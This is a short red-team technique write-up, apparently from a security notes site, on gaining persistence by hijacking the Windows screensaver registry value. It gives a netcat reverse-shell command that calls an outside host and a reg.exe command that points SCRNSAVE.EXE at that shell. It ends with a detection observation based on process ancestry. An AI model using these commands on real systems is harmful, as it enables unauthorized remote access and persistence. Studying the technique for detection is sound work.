---
description: Hijacking screensaver for persistence.
tags: [#persistence]
---

# Screensaver Hijack

## Execution

To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the registry  `HKCU\Control Panel\Desktop\` and change its data to point to any malicious file.&#x20;

In this test, I will use a netcat reverse shell as my malicious payload:

```csharp
// c:\shell.cmd@victim
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```

Let's update the registry:

![[screensaver-registry.png]]

The same could be achieved using a native Windows binary reg.exe:

```bash
// attacker@victim
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
```

![[screensaver-reg.png]]

## Observations

Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs. This is highly suspect and should warrant a further investigation:

![[screensaver-shell (1).png]]

![[screensaver-logs.png]]

## References

[attack.mitre.org/wiki/Technique/T1180](https://attack.mitre.org/wiki/Technique/T1180)

